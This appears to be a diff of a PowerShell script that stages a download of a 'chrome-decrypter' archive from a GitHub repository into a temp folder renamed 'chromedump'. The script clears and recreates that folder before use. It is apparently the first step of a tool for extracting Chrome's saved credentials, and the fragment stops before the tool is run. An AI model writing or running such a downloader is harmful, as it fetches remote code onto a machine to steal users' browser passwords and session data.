@@ -1,6 +1,7 @@
 ﻿$Link = "https://github.com/sabinfotograf/chrome_decrypt2024/raw/main/chrome-decrypter-master.rar"
-$File = Join-Path -Path "$Env:TMP\chrometest" -ChildPath "chrome-decrypter-master.rar"
-$Folder = Split-path $file -Parent; if(!(test-path $folder)){mkdir $Folder -Force | Out-Null}
+$File = Join-Path -Path "$Env:TMP\chromedump" -ChildPath "chrome-decrypter-master.rar"
+$Folder = Split-path $file -Parent; if(test-path $folder){rmdir $Folder -Recurse -Force | Out-Null}
+mkdir $Folder
 CLS
 
 Set-Location $folder
